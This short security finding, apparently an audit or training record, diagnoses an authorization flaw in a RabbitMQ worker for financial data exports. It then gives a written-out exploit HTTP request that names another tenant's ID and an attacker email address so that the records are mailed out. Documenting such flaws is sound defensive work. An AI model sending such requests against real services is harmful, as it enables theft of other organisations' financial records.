diagnosis: The RabbitMQ worker processes financial transaction data export requests. It queries financial_transactions for tenantId specified in the message payload and emails the resulting CSV report to recipientEmail without validating whether requestedByUserId belongs to tenantId or has financial export permissions. An attacker can exfiltrate financial records of other corporate tenants.
exploit_request:
POST /api/analytics/export HTTP/1.1
Host: fintech.enterprise.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"tenantId": "tenant_enterprise_7719", "recipientEmail": "attacker@leak.org"}
